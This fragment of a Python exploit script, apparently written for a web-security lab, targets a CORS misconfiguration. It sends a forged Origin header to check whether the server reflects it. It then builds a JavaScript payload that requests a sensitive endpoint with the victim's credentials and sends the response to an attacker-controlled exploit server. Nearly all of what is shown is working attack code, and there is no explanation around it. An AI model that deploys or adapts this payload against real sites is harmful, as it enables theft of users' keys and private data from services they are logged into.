...
exploit_host = "exploit-{YOU_EXPLOIT_HOST}.exploit-server.net"
...
form_headers["Origin"] = "https://malicious.google.com"
res_cors = requests.get(f"https://{home_host}{path_check}", headers=form_headers)

if res_cors.headers.get('Access-Control-Allow-Origin') == 'https://malicious.google.com':
...
payload = f"""<script>
    ...
    req.open('get','https://{home_host}{path_check}',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {{
        location='https://{exploit_host}/log?key='+this.responseText;
    }};
</script>"""
